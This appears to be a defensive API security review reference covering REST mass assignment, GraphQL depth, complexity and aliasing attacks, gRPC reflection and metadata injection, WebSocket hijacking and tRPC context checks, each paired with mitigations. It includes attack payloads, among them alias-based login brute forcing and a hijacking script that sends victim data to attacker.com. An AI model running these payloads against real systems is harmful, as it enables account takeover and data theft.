# API Security Reference

Load this file during Phase 9.

---

## REST API

### Method Consistency
- Same resource path, different HTTP verbs — authorization must be enforced on ALL methods
- `OPTIONS`, `HEAD`, `TRACE` methods often skip middleware chains
- `X-HTTP-Method-Override` header accepted by some frameworks → bypass method-level controls

### API Versioning
- Old versions (`/v1/`, `/api/v2/`) frequently lack:
  - Auth checks added in newer versions
  - Rate limiting
  - Input validation improvements
  - Security headers
- Test: replay authenticated requests from current version against all discovered legacy versions

### Mass Assignment
Per-ORM detection:
```ruby
# Rails — DANGEROUS (pre-strong params era, or bypass)
User.update_attributes(params)
User.new(params)

# Safe (strong params)
params.require(:user).permit(:name, :email)
```
```python
# Django REST — DANGEROUS
serializer = UserSerializer(user, data=request.data)  # if no field restriction

# Safe
class UserSerializer(serializers.ModelSerializer):
    class Meta:
        fields = ['name', 'email']  # explicit allowlist
        read_only_fields = ['is_admin', 'balance']
```
```javascript
// Mongoose — DANGEROUS
User.findByIdAndUpdate(id, req.body)  // entire body merged

// Safe
const { name, email } = req.body  // destructure only permitted fields
User.findByIdAndUpdate(id, { name, email })
```

### Pagination Enumeration
- Offset-based: `?page=1&limit=100` → increment page, dump all records
- Cursor-based: is cursor opaque + signed? Or guessable sequence?
- No upper bound on `limit` → `?limit=999999` → full table dump in one request

### Rate Limiting Coverage
Must cover:
- POST /login, /register, /password-reset, /verify-otp
- Any search/list endpoint (enumeration)
- Any email/SMS sending endpoint (abuse for spam/cost)
- Any expensive computation endpoint

---

## GraphQL

### Introspection in Production
```graphql
{ __schema { types { name fields { name type { name } } } } }
```
Disable in production. If business requirement to keep: IP-restrict or auth-gate.
Risk: full schema disclosure → attacker discovers all types, fields, mutations,
hidden admin operations, internal field names.

### Query Depth Attack
```graphql
{
  user {
    friends {
      friends {
        friends { friends { friends { ... } } }
      }
    }
  }
}
```
Mitigation: `graphql-depth-limit` or equivalent. Recommend max depth of 7–10.

### Query Complexity Attack
```graphql
{
  users(first: 100) {
    posts(first: 100) {
      comments(first: 100) {
        author { posts(first: 100) { ... } }
      }
    }
  }
}
```
100×100×100×100 = 10^8 DB calls from one request.
Mitigation: query complexity scoring with hard limit (e.g., 1000 points max).

### Batching / Aliasing Rate Limit Bypass
```graphql
mutation {
  a: login(username: "admin", password: "pass1") { token }
  b: login(username: "admin", password: "pass2") { token }
  c: login(username: "admin", password: "pass3") { token }
  # ... 1000 aliases in one HTTP request
}
```
Single HTTP request → bypasses per-request rate limiting.
Mitigation: rate limit at operation level (count aliases), disable batching, or
limit max operations per request.

### IDOR via GraphQL Node IDs
```graphql
query {
  node(id: "VXNlcjoxMjM=") {  # base64("User:123") → try User:456, User:1
    ... on User { email ssn balance }
  }
}
```
Authorization must be rechecked at resolver level, not just query level.

### Field-Level Authorization
- User has read access to `Order` object
- `Order.internalNotes`, `Order.costPrice`, `Order.supplierMargin` are sensitive fields
- Query-level auth passes; field-level auth must be separate

### Subscription Security
- WebSocket-based; authentication on connection vs per-subscription
- Attacker subscribes to another user's subscription channel
- Filter server-side: never trust client-provided filter for user-scoped subscriptions

---

## gRPC / Protobuf

### Reflection API in Production
```bash
grpc_cli ls target:443              # enumerate services
grpc_cli describe target:443 Service.Method  # get method signatures
```
Disable: `grpc.reflection.v1alpha.ServerReflection` must not be registered in production.

### Missing Field Validation
Protobuf enforces types but NOT:
- Value ranges (negative IDs, zero amounts)
- String length bounds
- Enum out-of-range values (default: 0, may be a privileged state)
- Required field presence (proto3 has no required keyword — all fields optional by default)

All business validation must happen in application code, not schema.

### Metadata Injection
gRPC metadata (headers) can be injected:
```go
// If server trusts metadata as authoritative internal header:
md := metadata.Pairs("x-internal-user-id", "1")  // attacker-supplied
ctx := metadata.NewOutgoingContext(context.Background(), md)
```
Treat gRPC metadata from external clients as untrusted. Auth context must come from
validated JWT/token in metadata, not raw metadata values.

### Streaming RPC Authentication
- Server-side streaming / bidirectional streaming: auth checked only on initial `RecvHeader`
- Subsequent messages accepted without re-verification
- Long-lived stream: token expires mid-stream; server must enforce expiry on stream events

### gRPC-Web CORS
- gRPC-Web uses HTTP/1.1 with CORS
- CORS misconfiguration on gRPC-Web proxy → cross-origin RPC calls from attacker page
- Proxy (Envoy/grpc-web-proxy) CORS config must match application auth requirements

---

## WebSocket

### Cross-Site WebSocket Hijacking (CSWSH)

Browser sends cookies on WS upgrade handshake — no CORS preflight for WS upgrades.

Attack:
```html
<!-- Attacker page -->
<script>
const ws = new WebSocket('wss://victim.com/ws');
ws.onmessage = (e) => fetch('https://attacker.com/?d=' + e.data);
ws.onopen = () => ws.send('{"action":"get_account_data"}');
</script>
```

Victim visits attacker page → attacker's JS opens WS to victim.com with victim's cookies
→ receives victim's account data.

Mitigation:
1. Validate `Origin` header on upgrade handshake (reject unexpected origins)
2. Use CSRF token in WebSocket URL or first message (not just cookies for auth)
3. Subprotocol validation

### Authentication Timing
- Auth only on HTTP upgrade → any subsequent message accepted
- Long-lived connections: JWT expiry not enforced after initial handshake
- Correct: validate token on upgrade AND implement token refresh / eviction

### Message Flooding
- No per-connection message rate limit → attacker sends 10k messages/sec → CPU exhaustion
- Implement: connection-level rate limiting + max message size limit

### Message Size
- Unbounded message size → memory exhaustion with one large frame
- Set max frame size in WS server configuration

---

## tRPC

### Procedure Exposure
- All tRPC procedures exported to client must be treated as public API
- `publicProcedure` vs `protectedProcedure` — verify every procedure uses correct base
- No auto-generated route discovery in prod (can expose internal procedure names)

### Input Validation
- tRPC uses Zod/Superstruct/Yup for input validation — verify schemas are strict:
  - `.strict()` on Zod objects (reject extra fields)
  - No `.optional()` on fields that should be required for auth context
  - String length limits, number range limits explicitly set

### Context Authentication
```typescript
// Vulnerable: context built from request but not validated
const trpc = initTRPC.context<Context>().create()
const protectedProcedure = trpc.procedure.use(({ ctx, next }) => {
  if (!ctx.user) throw new TRPCError({ code: 'UNAUTHORIZED' })
  return next({ ctx: { user: ctx.user } })
})

// Check: is ctx.user populated from validated JWT or from request body?
// If from request body → privilege escalation by supplying arbitrary user object
```

### Subscription Security
Same considerations as GraphQL subscriptions — filter server-side, auth per-subscription.
